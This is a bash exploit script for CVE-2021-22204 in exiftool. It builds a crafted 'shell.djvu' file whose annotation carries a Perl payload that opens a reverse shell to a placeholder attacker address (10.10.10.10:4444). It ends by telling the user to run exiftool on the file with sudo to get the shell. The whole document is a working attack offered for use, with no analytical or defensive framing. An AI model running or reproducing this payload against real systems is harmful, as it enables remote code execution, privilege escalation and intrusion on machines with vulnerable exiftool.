#!/bin/bash
# exiftool remote code execution, CVE-2021-22204
# this exploit requires exiftool to be run as sudo

echo "Creating a malicious file 'shell.djvu', which you will need for the exploitation"
printf 'P1 1 1 0' > shell.pbm
cjb2 shell.pbm shell.djvu
printf 'ANTa\0\0\0\xd3' >> shell.djvu

# replace "10.10.10.10" with your IP address
cat >> shell.djvu << 'EOF'
(xmp "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(4444,inet_aton('10.10.10.10')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};#"

EOF

echo "To receive a reverse shell:" 
echo "sudo /usr/local/bin/exiftool shell.djvu"
